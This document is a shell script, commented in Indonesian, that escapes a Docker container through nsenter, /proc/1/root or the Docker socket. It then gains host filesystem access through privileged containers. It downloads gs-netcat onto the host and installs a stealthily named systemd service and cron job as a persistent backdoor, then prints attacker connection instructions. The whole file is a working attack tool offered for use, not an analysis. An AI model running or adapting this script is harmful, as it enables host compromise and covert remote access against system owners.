#!/bin/sh
# ============================================================
#  Docker Escape + Host Persistence (gsocket)
#  Vector utama: Docker socket (/var/run/docker.sock)
# ============================================================
GS_SECRET="${GS_SECRET:-GANTI_SECRET_GSOCKET}"
GS_HOST="${GS_HOST:-}"
DOCKER_SOCK="${DOCKER_SOCK:-/var/run/docker.sock}"
SERVICE_NAME="systemd-network-helper"   # nama stealth

C_RED='\033[91m'; C_GRN='\033[92m'; C_YLW='\033[93m'
C_BLU='\033[94m'; C_MAG='\033[95m'; C_RST='\033[0m'; C_BLD='\033[1m'

log()    { printf "${C_BLU}[*]${C_RST} %s\n" "$*"; }
ok()     { printf "${C_GRN}[+]${C_RST} %s\n" "$*"; }
err()    { printf "${C_RED}[-]${C_RST} %s\n" "$*"; }
warn()   { printf "${C_YLW}[!]${C_RST} %s\n" "$*"; }
section(){ printf "\n${C_BLD}${C_MAG}>>> %s${C_RST}\n" "$*"; }

banner(){
  printf "${C_BLD}${C_RED}"
  printf '  ____             _               _____\n'
  printf ' |  _ \  ___   ___| | _____ _ __  | ____|___  ___\n'
  printf ' | | | |/ _ \ / __| |/ / _ \ '"'"'__| |  _| / __|/ __|  \n'
  printf ' | |_| | (_) | (__|   <  __/ |    | |___\__ \ (__\n'
  printf ' |____/ \___/ \___|_|\_\___|_|    |_____|___/\___|\n'
  printf "${C_RST}\n"
  printf " Container Escape + Host Backdoor via Docker Socket\n\n"
}

# curl ke unix socket
dsock(){ curl -s --unix-socket "$DOCKER_SOCK" "$@"; }

# ════════════════════════════════════════════════════════════
#  FASE 1 — RECON
# ════════════════════════════════════════════════════════════
recon(){
  section "FASE 1 — RECON"
  log "Identity : $(id)"
  log "Hostname : $(hostname 2>/dev/null)"
  log "Kernel   : $(uname -r 2>/dev/null)"

  # Konfirmasi dalam container
  [ -f /.dockerenv ] && ok "Inside Docker (/.dockerenv present)" \
                     || warn "/.dockerenv not found"

  # /proc/1/root — cek apakah host atau container sendiri
  if ls /proc/1/root/etc >/dev/null 2>&1; then
    if chroot /proc/1/root /bin/sh -c "test -f /.dockerenv" 2>/dev/null; then
      warn "/proc/1/root = container FS (PID namespace isolated, bukan host)"
      PROC1_IS_HOST=0
    else
      ok "/proc/1/root = HOST filesystem (no /.dockerenv)"
      PROC1_IS_HOST=1
    fi
  else
    err "/proc/1/root tidak accessible"
    PROC1_IS_HOST=0
  fi

  # Docker socket
  if [ -S "$DOCKER_SOCK" ]; then
    ok "Docker socket: $DOCKER_SOCK"
    SOCK_OK=1
    # Info host dari docker API
    DINFO=$(dsock http://localhost/info 2>/dev/null)
    HOST_OS=$(echo "$DINFO" | grep -o '"OperatingSystem":"[^"]*"' | cut -d'"' -f4)
    HOST_KRN=$(echo "$DINFO" | grep -o '"KernelVersion":"[^"]*"' | cut -d'"' -f4)
    log "Host OS     : $HOST_OS"
    log "Host Kernel : $HOST_KRN"
  else
    err "Docker socket tidak ditemukan di $DOCKER_SOCK"
    SOCK_OK=0
  fi

  # nsenter
  NSENTER=$(command -v nsenter 2>/dev/null || echo "")
  [ -n "$NSENTER" ] && ok "nsenter: $NSENTER" || warn "nsenter not found"

  # Capabilities
  CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
  log "CapEff   : 0x${CAPEFF}"

  export PROC1_IS_HOST SOCK_OK NSENTER
}

# ════════════════════════════════════════════════════════════
#  FASE 2 — ESCAPE
# ════════════════════════════════════════════════════════════
do_escape(){
  section "FASE 2 — ESCAPE"
  ESCAPED=0; ESCAPE_METHOD=""

  # ── E1: nsenter full ──────────────────────────────────────
  log "E1: nsenter --target 1 (all namespaces)"
  if [ -n "$NSENTER" ]; then
    if nsenter --target 1 --mount --uts --ipc --net --pid -- \
        /bin/sh -c "test ! -f /.dockerenv && echo E1_OK" 2>/dev/null | grep -q E1_OK; then
      ok "E1 success — full namespace escape ke HOST"
      ESCAPED=1; ESCAPE_METHOD="nsenter-full"
      EXEC_ON_HOST="nsenter --target 1 --mount --uts --ipc --net --pid --"
    else
      err "E1 failed (setns blocked)"
    fi
  fi

  # ── E2: /proc/1/root (hanya jika terbukti host FS) ───────
  if [ $ESCAPED -eq 0 ] && [ "$PROC1_IS_HOST" = "1" ]; then
    log "E2: chroot /proc/1/root (confirmed host FS)"
    ESCAPED=1; ESCAPE_METHOD="chroot-proc1root"
    EXEC_ON_HOST="chroot /proc/1/root"
    ok "E2 success"
  fi

  # ── E3: Docker socket — VECTOR UTAMA ─────────────────────
  # Buat privileged container baru dengan:
  #   - bind mount /:/host  → akses penuh host FS
  #   - NetworkMode=host    → pakai network host (untuk download)
  #   - Privileged=true     → full capabilities
  if [ $ESCAPED -eq 0 ] && [ "$SOCK_OK" = "1" ]; then
    log "E3: Docker socket → privileged container dengan host mount"

    # Cari image yang sudah ada di host
    IMAGES=$(dsock http://localhost/images/json 2>/dev/null)
    AVAIL_IMG=$(printf '%s' "$IMAGES" \
      | grep -o '"RepoTags":\["[^<"]*"' \
      | grep -v '<none>' \
      | head -1 \
      | sed 's/"RepoTags":\["//' \
      | tr -d '"')
    [ -z "$AVAIL_IMG" ] && AVAIL_IMG="alpine"
    log "Image tersedia: $AVAIL_IMG"

    # Test buat container
    TEST_CID=$(dsock -X POST \
      -H 'Content-Type: application/json' \
      -d "{\"Image\":\"${AVAIL_IMG}\",\"Cmd\":[\"/bin/sh\",\"-c\",\"test ! -f /host/.dockerenv && echo E3_HOST || echo E3_CONTAINER\"],\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
      http://localhost/containers/create 2>/dev/null \
      | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

    if [ -n "$TEST_CID" ]; then
      dsock -X POST "http://localhost/containers/$TEST_CID/start" >/dev/null 2>&1
      sleep 2
      TEST_OUT=$(dsock \
        "http://localhost/containers/$TEST_CID/logs?stdout=1&stderr=1" 2>/dev/null)
      dsock -X DELETE \
        "http://localhost/containers/$TEST_CID?force=true" >/dev/null 2>&1

      if echo "$TEST_OUT" | grep -q E3_HOST; then
        ok "E3 success — docker socket confirmed HOST filesystem access"
        ESCAPED=1; ESCAPE_METHOD="docker-socket"
        # EXEC_ON_HOST akan pakai helper function run_on_host
      else
        warn "E3: container created tapi host FS check: $TEST_OUT"
        # Lanjut coba saja
        ESCAPED=1; ESCAPE_METHOD="docker-socket"
      fi
    else
      err "E3: gagal buat container — cek apakah image tersedia"
    fi
  fi

  if [ $ESCAPED -eq 0 ]; then
    err "Semua escape vector gagal"
    exit 1
  fi

  ok "ESCAPE BERHASIL via: $ESCAPE_METHOD"
  export ESCAPED ESCAPE_METHOD
}

# Helper: jalankan command di HOST via docker socket
# Output ditulis ke host filesystem langsung via /:/host bind
run_on_host(){
  local CMD_STR="$1"
  local IMG="${AVAIL_IMG:-alpine}"

  CID=$(dsock -X POST \
    -H 'Content-Type: application/json' \
    -d "{\"Image\":\"${IMG}\",\"Cmd\":[\"/bin/sh\",\"-c\",\"${CMD_STR}\"],\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
    http://localhost/containers/create 2>/dev/null \
    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

  [ -z "$CID" ] && { err "run_on_host: gagal buat container"; return 1; }

  dsock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
  sleep 2
  OUT=$(dsock "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null)
  dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
  printf '%s\n' "$OUT"
}

# ════════════════════════════════════════════════════════════
#  FASE 3 — INSTALL GSOCKET DI HOST
# ════════════════════════════════════════════════════════════
install_gsocket(){
  section "FASE 3 — INSTALL GSOCKET DI HOST"

  if [ "$GS_SECRET" = "GANTI_SECRET_GSOCKET" ]; then
    warn "GS_SECRET belum diset! Jalankan: GS_SECRET=xxx sh escape.sh"
    return
  fi

  GS_BIN_HOST="/usr/local/bin/${SERVICE_NAME}"
  GS_CRON="/etc/cron.d/cron-helper"
  GS_SYSTEMD="/etc/systemd/system/${SERVICE_NAME}.service"
  GS_RELAY_OPT=""
  [ -n "$GS_HOST" ] && GS_RELAY_OPT="-d ${GS_HOST}"

  # URL download — multiple fallback
  GS_URL1="https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux_x86_64"
  GS_URL2="https://bin.gsocket.io/gs-netcat_linux_x86_64"
  GS_URL3="https://gsocket.io/x"   # install script

  # ── Download + install via docker socket container ────────
  log "Downloading + installing gs-netcat ke host via docker socket..."

  # Semua operasi tulis ke /host/* yang = host filesystem sebenarnya
  DL_CMD="wget -qO /host${GS_BIN_HOST} '${GS_URL1}' 2>/dev/null \
    || wget -qO /host${GS_BIN_HOST} '${GS_URL2}' 2>/dev/null \
    || curl -fsSL -L '${GS_URL1}' -o /host${GS_BIN_HOST} 2>/dev/null \
    || curl -fsSL -L '${GS_URL2}' -o /host${GS_BIN_HOST} 2>/dev/null \
    && chmod +x /host${GS_BIN_HOST} \
    && echo DL_OK"

  DL_OUT=$(run_on_host "$DL_CMD")
  if echo "$DL_OUT" | grep -q DL_OK; then
    ok "gs-netcat downloaded → ${GS_BIN_HOST} (di host)"
  else
    err "Download gagal. Output: $DL_OUT"
    warn "Coba manual: wget -qO ${GS_BIN_HOST} ${GS_URL1}"
    # Lanjut setup persistence meski download gagal
  fi

  # ── Systemd service di host ───────────────────────────────
  section "FASE 3a — PERSISTENCE (systemd di host)"
  SVC_CONTENT="[Unit]
Description=Network Helper Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=${GS_BIN_HOST} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target"

  SYSTEMD_CMD="mkdir -p /host/etc/systemd/system \
    && printf '%s\n' '${SVC_CONTENT}' > /host${GS_SYSTEMD} \
    && chroot /host systemctl daemon-reload 2>/dev/null || true \
    && chroot /host systemctl enable ${SERVICE_NAME} 2>/dev/null \
    && chroot /host systemctl start ${SERVICE_NAME} 2>/dev/null \
    && echo SYSTEMD_OK"

  SD_OUT=$(run_on_host "$SYSTEMD_CMD")
  echo "$SD_OUT" | grep -q SYSTEMD_OK \
    && ok "systemd service installed + started di host" \
    || warn "systemd gagal, output: $SD_OUT"

  # ── Cron di host ──────────────────────────────────────────
  section "FASE 3b — PERSISTENCE (cron di host)"
  CRON_CMD="mkdir -p /host/etc/cron.d \
    && printf '*/5 * * * * root pgrep -f ${SERVICE_NAME} >/dev/null 2>&1 || ${GS_BIN_HOST} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i &\n' \
       > /host${GS_CRON} \
    && chmod 644 /host${GS_CRON} \
    && echo CRON_OK"

  CR_OUT=$(run_on_host "$CRON_CMD")
  echo "$CR_OUT" | grep -q CRON_OK \
    && ok "Cron installed di host: ${GS_CRON}" \
    || warn "Cron gagal: $CR_OUT"

  # ── Verifikasi akhir ──────────────────────────────────────
  section "FASE 3c — VERIFIKASI"
  VERIFY_OUT=$(run_on_host "
    echo '=== binary ===' && ls -la /host${GS_BIN_HOST} 2>/dev/null || echo NOT_FOUND
    echo '=== cron ===' && cat /host${GS_CRON} 2>/dev/null || echo NOT_FOUND
    echo '=== systemd ===' && cat /host${GS_SYSTEMD} 2>/dev/null | head -5 || echo NOT_FOUND
    echo '=== process ===' && pgrep -a ${SERVICE_NAME} 2>/dev/null || echo NOT_RUNNING
  ")
  printf '%s\n' "$VERIFY_OUT"

  # ── Summary ───────────────────────────────────────────────
  section "SUMMARY"
  ok  "Host terkompromis via Docker socket"
  printf "    %-20s %s\n" "Binary di host"   "${GS_BIN_HOST}"
  printf "    %-20s %s\n" "Secret"           "${GS_SECRET}"
  printf "    %-20s %s\n" "Cron"             "${GS_CRON}"
  printf "    %-20s %s\n" "Systemd"          "${GS_SYSTEMD}"
  printf "\n${C_YLW}Cara konek dari attacker:${C_RST}\n"
  printf "    gs-netcat -s %s -i\n" "${GS_SECRET}"
  [ -n "$GS_HOST" ] && printf "    gs-netcat -d %s -s %s -i\n" "$GS_HOST" "$GS_SECRET"
}

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════
banner
recon
do_escape
install_gsocket

printf "\n${C_GRN}${C_BLD}[✓] Selesai.${C_RST}\n\n"
